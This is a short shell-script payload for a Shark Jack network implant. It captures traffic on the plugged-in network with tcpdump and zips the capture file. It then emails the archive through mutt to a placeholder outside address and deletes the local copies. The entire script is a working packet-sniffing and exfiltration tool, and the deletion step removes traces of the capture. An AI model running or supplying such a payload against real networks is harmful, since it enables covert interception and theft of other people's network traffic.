#!/bin/sh
# Title:         Simple tcpdump
# Description:   Exemple of tcpdump with exfiltrationvia email
# Author:        Jules Bozouklian - bozou_client
# Version:       1.0
# Category:      Template
#
# LED SETUP (Magenta)... Setting logs and waiting for IP address from DHCP
# LED FAIL (Red Blink)... Failed to update opkg or install package
# LED FINISH (Green Fast Blink to Solid)... Package install or listsuccessful
#

LOG_DIR=/root/loot/recon/simple-tcpdump
DATE=`date +"%Y-%m-%d"`
TIMESTAMP=`date +"%Y-%m-%d %T"`
INTERFACE="eth0"
TIMEOUT="15"
EMAIL_RECEIPT="EMAIL@DOMAIN.xyz"
MUTT_FILE=/root/.muttrc

LED SETUP

NETMODE DHCP_CLIENT

# Make log file
mkdir -p $LOG_DIR
LOG_FILE=$DATE"_$(find $LOG_DIR -type f | wc -l).log"
LOG="$LOG_DIR/$LOG_FILE"

# Wait until Shark Jack has an IP address
while [ -z "$IPADDR" ]; do sleep 1 && IPADDR=$(ifconfig eth0 | grep "inet addr"); done

LED ATTACK

# TCPDUMP traffic on port 80 and 443
echo -e "TCPDUMP start at `date`" >> $LOG
# change the value of $TIMEOUT variable to change the duration of the tcpdump cature
timeout $TIMEOUT tcpdump -i $INTERFACE -w capture.pcap
echo -e "TCPDUMP end  at `date`" >> $LOG

# create archive
echo -e "Create archive  at `date`" >> $LOG
zip -r /root/archive.zip /root/capture.pcap

# send pcap by mail
function sendEmail() {
  echo "tcpdump pcap" | mutt -F $MUTT_FILE -a /root/archive.zip -s "Log $TIMESTAMP" -- $EMAIL_RECEIPT
  sleep 5s
}

sendEmail

# remove file
rm /root/capture.pcap
rm /root/archive.zip

LED FINISH
